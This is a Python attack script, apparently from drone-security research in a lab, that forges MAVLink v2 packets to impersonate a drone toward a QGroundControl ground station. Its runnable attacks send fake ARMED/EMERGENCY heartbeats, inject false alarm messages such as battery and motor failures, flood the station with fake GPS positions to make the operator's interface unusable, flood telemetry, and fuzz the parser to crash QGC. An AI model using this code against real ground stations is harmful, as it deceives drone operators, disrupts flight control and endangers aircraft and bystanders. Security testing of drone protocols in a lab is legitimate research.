"""
Script 2: inject_qgc.py
========================
Injection verso QGC impersonando il drone compromesso.

Attacks implemented:
  A) Heartbeat falsificato  — mostra stato falso nella UI di QGC
  B) STATUSTEXT injection   — mostra messaggi arbitrari in QGC
  C) Emergency state        — forza stato EMERGENCY nella UI
  D) Flood telemetria       — inonda QGC con dati telemetrici falsi
  E) Fuzzing payload        — pacchetti malformati per cercare crash QGC

Uso:
    python inject_qgc.py --attack A
    python inject_qgc.py --attack B --message "CRITICAL: Battery failure"
    python inject_qgc.py --attack C
    python inject_qgc.py --attack D --count 500
    python inject_qgc.py --attack E --count 1000

IMPORTANTE: Adatta i valori nella sezione CONFIG prima di eseguire.
Usa recon.py per ottenere i valori corretti.

Requirements:
    pip install pymavlink
"""

import socket
import struct
import time
import random
import argparse
import math
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
#  CONFIG — aggiorna con i valori di recon.py
# ═══════════════════════════════════════════════════════════════

# Il drone che controlliamo (chi impersoniamo come mittente)
DRONE = {
    "sysid":  1,
    "compid": 1,
    "ip":     "172.25.12.121",  # IP WSL2 del drone
    "port":   18570,
}

# QGC — destinatario dei nostri pacchetti
GCS = {
    "sysid":  255,
    "compid": 190,
    "ip":     "172.25.0.1",     # IP Windows di QGC
    "port":   18570,
}

# ═══════════════════════════════════════════════════════════════

# Costanti MAVLink
MAV_V2_STX        = 0xFD
MAV_AUTOPILOT_PX4 = 12
MAV_TYPE_QUAD     = 2

# base_mode flags
MAV_MODE_FLAG_ARMED          = 0x80
MAV_MODE_FLAG_AUTO_ENABLED   = 0x04
MAV_MODE_FLAG_GUIDED_ENABLED = 0x08
MAV_MODE_FLAG_STABILIZE      = 0x10

# system_status
MAV_STATE_STANDBY   = 3
MAV_STATE_ACTIVE    = 4
MAV_STATE_CRITICAL  = 5
MAV_STATE_EMERGENCY = 6


def compute_crc(data: bytes, seed: int) -> int:
    """
    Calcola il CRC X.25 (CRC-16/MCRF4XX) usato da MAVLink.
    Il seed è il CRC_EXTRA specifico per ogni tipo di messaggio.
    """
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    # Aggiungi il seed (CRC_EXTRA)
    tmp = seed ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


# CRC_EXTRA per i messaggi che usiamo
# Questi valori sono costanti definite nello standard MAVLink
CRC_EXTRA = {
    0:   50,   # HEARTBEAT
    30:  39,   # ATTITUDE
    33:  104,  # GLOBAL_POSITION_INT
    253: 83,   # STATUSTEXT
    76:  152,  # COMMAND_LONG
    74:  20,   # VFR_HUD
    32:  185,  # LOCAL_POSITION_NED
}


def build_mavlink_v2_packet(sysid: int, compid: int, msgid: int,
                             payload: bytes, seq: int,
                             crc_extra: int) -> bytes:
    """
    Costruisce un pacchetto MAVLink v2 completo e valido.
    Header + Payload + CRC calcolato correttamente.
    """
    length   = len(payload)
    inc_flag = 0x00   # non firmato
    cmp_flag = 0x00

    # Header: STX(1) + LEN(1) + INC(1) + CMP(1) + SEQ(1) +
    #         SYSID(1) + COMPID(1) + MSGID(3) = 10 bytes
    msgid_bytes = msgid.to_bytes(3, 'little')
    header = bytes([
        MAV_V2_STX,
        length,
        inc_flag,
        cmp_flag,
        seq & 0xFF,
        sysid,
        compid,
    ]) + msgid_bytes

    # CRC calcolato su: header[1:] + payload + crc_extra
    crc_data = header[1:] + payload
    crc_val  = compute_crc(crc_data, crc_extra)
    crc_bytes = struct.pack('<H', crc_val)

    return header + payload + crc_bytes


def build_heartbeat(sysid: int, compid: int, seq: int,
                    system_status: int = MAV_STATE_ACTIVE,
                    base_mode: int = MAV_MODE_FLAG_ARMED,
                    custom_mode: int = 0) -> bytes:
    """Costruisce un HEARTBEAT (msgid=0)."""
    payload = struct.pack('<IBBBBB',
        custom_mode,      # custom_mode (4 bytes)
        MAV_TYPE_QUAD,    # type
        MAV_AUTOPILOT_PX4, # autopilot
        base_mode,        # base_mode
        system_status,    # system_status
        3,                # mavlink_version
    )
    return build_mavlink_v2_packet(sysid, compid, 0, payload, seq, CRC_EXTRA[0])


def build_statustext(sysid: int, compid: int, seq: int,
                     text: str, severity: int = 4) -> bytes:
    """
    Costruisce un STATUSTEXT (msgid=253).
    severity: 0=EMERGENCY, 1=ALERT, 2=CRITICAL, 3=ERROR,
              4=WARNING, 5=NOTICE, 6=INFO, 7=DEBUG
    """
    text_bytes = text.encode('utf-8')[:50].ljust(50, b'\x00')
    payload = bytes([severity]) + text_bytes
    return build_mavlink_v2_packet(sysid, compid, 253, payload, seq, CRC_EXTRA[253])


def build_attitude(sysid: int, compid: int, seq: int,
                   roll: float = 0.0, pitch: float = 0.0,
                   yaw: float = 0.0) -> bytes:
    """Costruisce un ATTITUDE (msgid=30)."""
    time_boot_ms = int(time.time() * 1000) & 0xFFFFFFFF
    payload = struct.pack('<Iffffff',
        time_boot_ms,
        roll, pitch, yaw,
        0.0, 0.0, 0.0,   # rollspeed, pitchspeed, yawspeed
    )
    return build_mavlink_v2_packet(sysid, compid, 30, payload, seq, CRC_EXTRA[30])


def build_global_position(sysid: int, compid: int, seq: int,
                           lat: float = 47.397742, lon: float = 8.545594,
                           alt: float = 488.0) -> bytes:
    """Costruisce un GLOBAL_POSITION_INT (msgid=33)."""
    time_boot_ms = int(time.time() * 1000) & 0xFFFFFFFF
    payload = struct.pack('<IiiiihhhH',
        time_boot_ms,
        int(lat * 1e7),
        int(lon * 1e7),
        int(alt * 1000),
        int(15 * 1000),  # relative_alt
        0, 0, 0,         # vx, vy, vz
        0,               # hdg
    )
    return build_mavlink_v2_packet(sysid, compid, 33, payload, seq, CRC_EXTRA[33])


class Injector:
    def __init__(self, target_ip: str, target_port: int):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.target = (target_ip, target_port)
        self.seq = 0

    def send(self, pkt: bytes):
        self.sock.sendto(pkt, self.target)
        self.seq = (self.seq + 1) % 256

    def close(self):
        self.sock.close()


# ── Attacchi ─────────────────────────────────────────────────────────────────

def attack_A_fake_heartbeat(inj: Injector, count: int = 50):
    """
    Attacco A: Invia HEARTBEAT falsificati impersonando il drone.
    Mostra stato ARMED + EMERGENCY nell'interfaccia QGC.
    QGC aggiornerà immediatamente la UI con questi valori falsi.
    """
    print(f"\n[A] Fake Heartbeat Attack → QGC @ {inj.target}")
    print(f"    Sending {count} HEARTBEATs with EMERGENCY+ARMED state...")
    print(f"    Osserva QGC: il drone dovrebbe mostrare stato critico\n")

    for i in range(count):
        # Alterna tra stati diversi per rendere visibile l'attacco
        if i % 3 == 0:
            status    = MAV_STATE_EMERGENCY
            base_mode = MAV_MODE_FLAG_ARMED
            label     = "EMERGENCY+ARMED"
        elif i % 3 == 1:
            status    = MAV_STATE_CRITICAL
            base_mode = MAV_MODE_FLAG_ARMED | MAV_MODE_FLAG_AUTO_ENABLED
            label     = "CRITICAL+AUTO"
        else:
            status    = MAV_STATE_STANDBY
            base_mode = 0x00
            label     = "STANDBY+DISARMED"

        pkt = build_heartbeat(
            DRONE["sysid"], DRONE["compid"], inj.seq,
            system_status=status,
            base_mode=base_mode,
        )
        inj.send(pkt)
        print(f"    [{i+1:3d}/{count}] seq={inj.seq-1:3d} → {label}")
        time.sleep(0.1)

    print(f"\n    [+] Attack A completato. {count} packets sent.")


def attack_B_statustext(inj: Injector, message: str = None, count: int = 5):
    """
    Attacco B: Inietta messaggi STATUSTEXT arbitrari in QGC.
    Il messaggio appare nella console di QGC come se venisse dal drone.
    """
    messages = [
        ("CRITICAL: Battery at 1% - Emergency landing", 2),
        ("WARNING: GPS signal lost", 4),
        ("ERROR: Motor 2 failure detected", 3),
        ("ALERT: Geofence breach imminent", 1),
        ("INFO: Mission waypoint updated by operator", 6),
        ("CRITICAL: Autopilot failure - manual control required", 2),
    ]

    if message:
        messages = [(message, 4)] * count

    print(f"\n[B] STATUSTEXT Injection Attack → QGC @ {inj.target}")
    print(f"    Invio messaggi di testo falsi nella console QGC...\n")

    for i, (msg, sev) in enumerate(messages):
        pkt = build_statustext(
            DRONE["sysid"], DRONE["compid"], inj.seq,
            text=msg, severity=sev,
        )
        inj.send(pkt)
        sev_names = {0:"EMERGENCY",1:"ALERT",2:"CRITICAL",
                     3:"ERROR",4:"WARNING",5:"NOTICE",6:"INFO"}
        print(f"    [{i+1}] [{sev_names.get(sev,'?')}] {msg}")
        time.sleep(0.3)

    print(f"\n    [+] Attack B completato.")


def attack_C_emergency_flood(inj: Injector, duration: int = 10):
    """
    Attacco C: Flood continuo di HEARTBEAT EMERGENCY + posizioni false.
    Obiettivo: saturare QGC con eventi critici e rendere
    la UI inutilizzabile per l'operatore reale.
    """
    print(f"\n[C] Emergency State Flood → QGC @ {inj.target}")
    print(f"    Flood per {duration} secondi...")
    print(f"    QGC will receive hundreds of simultaneous EMERGENCY alerts\n")

    start = time.time()
    count = 0

    # Posizioni false in un raggio strano per confondere l'operatore
    base_lat = 47.397742
    base_lon = 8.545594

    while time.time() - start < duration:
        # HEARTBEAT emergency
        pkt_hb = build_heartbeat(
            DRONE["sysid"], DRONE["compid"], inj.seq,
            system_status=MAV_STATE_EMERGENCY,
            base_mode=MAV_MODE_FLAG_ARMED,
        )
        inj.send(pkt_hb)

        # Posizione GPS falsa con deriva casuale
        fake_lat = base_lat + random.uniform(-0.01, 0.01)
        fake_lon = base_lon + random.uniform(-0.01, 0.01)
        pkt_pos = build_global_position(
            DRONE["sysid"], DRONE["compid"], inj.seq,
            lat=fake_lat, lon=fake_lon, alt=random.uniform(0, 500),
        )
        inj.send(pkt_pos)

        count += 2
        time.sleep(0.05)  # 20 Hz

    elapsed = time.time() - start
    print(f"\n    [+] Attack C completato: {count} packets in {elapsed:.1f}s "
          f"({count/elapsed:.0f} pkt/s)")


def attack_D_telemetry_flood(inj: Injector, count: int = 1000):
    """
    Attacco D: Flood di dati telemetrici ad alta frequenza.
    Simula un drone che invia dati a frequenza anomala.
    Può causare buffer overflow nel parser di QGC.
    """
    print(f"\n[D] Telemetry Flood → QGC @ {inj.target}")
    print(f"    Sending {count} telemetry packets at maximum speed...\n")

    start = time.time()
    for i in range(count):
        # Alterna tipi di messaggio
        if i % 3 == 0:
            pkt = build_attitude(
                DRONE["sysid"], DRONE["compid"], inj.seq,
                roll=random.uniform(-math.pi, math.pi),
                pitch=random.uniform(-math.pi/2, math.pi/2),
                yaw=random.uniform(-math.pi, math.pi),
            )
        elif i % 3 == 1:
            pkt = build_global_position(
                DRONE["sysid"], DRONE["compid"], inj.seq,
                lat=47.397742 + random.uniform(-0.001, 0.001),
                lon=8.545594  + random.uniform(-0.001, 0.001),
                alt=random.uniform(0, 1000),
            )
        else:
            pkt = build_heartbeat(
                DRONE["sysid"], DRONE["compid"], inj.seq,
                system_status=MAV_STATE_ACTIVE,
                base_mode=MAV_MODE_FLAG_ARMED,
            )
        inj.send(pkt)

        if i % 100 == 0:
            elapsed = time.time() - start
            rate    = i / elapsed if elapsed > 0 else 0
            print(f"    [{i:5d}/{count}] {rate:.0f} pkt/s")

    elapsed = time.time() - start
    print(f"\n    [+] Attack D completato: {count} packets in {elapsed:.1f}s")


def attack_E_fuzzing(inj: Injector, count: int = 500):
    """
    Attacco E — Fuzzing del parser QGC (Strategy A).
    Invia pacchetti MAVLink con payload anomali su msgid vari
    per cercare crash o comportamenti anomali in QGC.

    Tecniche usate:
    - Payload tutto-zero
    - Payload tutto-0xFF
    - Payload con valori NaN/INF come float
    - Lunghezza payload > attesa
    - Lunghezza payload = 0
    - msgid fuori range
    - Valori estremi nei campi critici
    """
    print(f"\n[E] Fuzzing Attack → QGC @ {inj.target}")
    print(f"    {count} fuzzing iterations on QGC MAVLink parser")
    print(f"    Monitor qgroundcontrol.exe for crashes!\n")

    # Seed cases basati sui messaggi più frequenti nel traffico reale
    target_msgids = [0, 30, 33, 74, 253, 76, 32, 83, 85, 36]

    # Generatori di payload anomali
    def payload_zeros(n):     return bytes(n)
    def payload_ff(n):        return bytes([0xFF] * n)
    def payload_nan(n):
        # Riempi con NaN IEEE 754
        count_floats = n // 4
        return struct.pack(f'<{count_floats}f', *[float('nan')] * count_floats) + bytes(n % 4)
    def payload_inf(n):
        count_floats = n // 4
        return struct.pack(f'<{count_floats}f', *[float('inf')] * count_floats) + bytes(n % 4)
    def payload_random(n):    return bytes(random.randint(0, 255) for _ in range(n))
    def payload_maxint(n):    return struct.pack(f'<{n//4}I', *[0xFFFFFFFF] * (n//4)) + bytes(n%4)
    def payload_overflow(n):  return bytes(range(256)) * (n // 256 + 1)[:n]

    generators = [
        ("ALL_ZEROS",  payload_zeros),
        ("ALL_FF",     payload_ff),
        ("NaN_FLOATS", payload_nan),
        ("INF_FLOATS", payload_inf),
        ("RANDOM",     payload_random),
        ("MAX_INT",    payload_maxint),
    ]

    # Lunghezze da testare (boundary conditions)
    lengths = [0, 1, 4, 8, 16, 32, 64, 128, 255]

    crashes_detected = 0
    sent = 0

    for iteration in range(count):
        # Scegli parametri casuali
        msgid    = random.choice(target_msgids)
        gen_name, gen_func = random.choice(generators)
        length   = random.choice(lengths)

        try:
            payload = gen_func(length) if length > 0 else b''

            # Costruisci pacchetto con CRC_EXTRA corretto se disponibile,
            # altrimenti usa un valore casuale per testare anche quello
            crc_extra = CRC_EXTRA.get(msgid, random.randint(0, 255))

            pkt = build_mavlink_v2_packet(
                DRONE["sysid"], DRONE["compid"],
                msgid, payload, inj.seq, crc_extra,
            )
            inj.send(pkt)
            sent += 1

            if iteration % 50 == 0:
                print(f"    [{iteration:5d}/{count}] msgid={msgid:4d} "
                      f"len={length:3d} type={gen_name}")

        except Exception as e:
            print(f"    [!] Packet generation error: {e}")
            continue

        # Piccola pausa per non saturare la rete
        time.sleep(0.005)

    print(f"\n    [+] Fuzzing complete: {sent} packets sent")
    print(f"    [!] Check if QGC is still running on Windows")
    print(f"    [!] Controlla i log di QGC per errori o crash")


# ── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="inject_qgc.py — Injection towards QGC impersonating drone"
    )
    parser.add_argument("--attack",  required=True,
                        choices=["A", "B", "C", "D", "E", "ALL"],
                        help="Attacco da eseguire")
    parser.add_argument("--message", default=None,
                        help="Text for attack B (STATUSTEXT)")
    parser.add_argument("--count",   type=int, default=None,
                        help="Numero di pacchetti (default dipende dall'attacco)")
    parser.add_argument("--duration",type=int, default=10,
                        help="Duration in seconds for attack C (default: 10)")
    parser.add_argument("--target-ip",   default=GCS["ip"],
                        help=f"IP target QGC (default: {GCS['ip']})")
    parser.add_argument("--target-port", type=int, default=GCS["port"],
                        help=f"Porta UDP QGC (default: {GCS['port']})")
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  inject_qgc.py — IoD Security Research")
    print(f"  Target QGC : {args.target_ip}:{args.target_port}")
    print(f"  Drone      : sysid={DRONE['sysid']} compid={DRONE['compid']}")
    print(f"  Attack     : {args.attack}")
    print(f"  Time       : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}")

    inj = Injector(args.target_ip, args.target_port)

    try:
        if args.attack == "A":
            attack_A_fake_heartbeat(inj, count=args.count or 30)

        elif args.attack == "B":
            attack_B_statustext(inj, message=args.message,
                                count=args.count or 6)

        elif args.attack == "C":
            attack_C_emergency_flood(inj, duration=args.duration)

        elif args.attack == "D":
            attack_D_telemetry_flood(inj, count=args.count or 1000)

        elif args.attack == "E":
            attack_E_fuzzing(inj, count=args.count or 500)

        elif args.attack == "ALL":
            print("\n[*] Sequential execution of all attacks...\n")
            attack_A_fake_heartbeat(inj, count=20)
            time.sleep(1)
            attack_B_statustext(inj)
            time.sleep(1)
            attack_C_emergency_flood(inj, duration=5)
            time.sleep(1)
            attack_E_fuzzing(inj, count=200)

    except KeyboardInterrupt:
        print(f"\n\n[!] Interrupted by user.")
    finally:
        inj.close()
        print(f"\n[*] Socket closed. Fine.")


if __name__ == "__main__":
    main()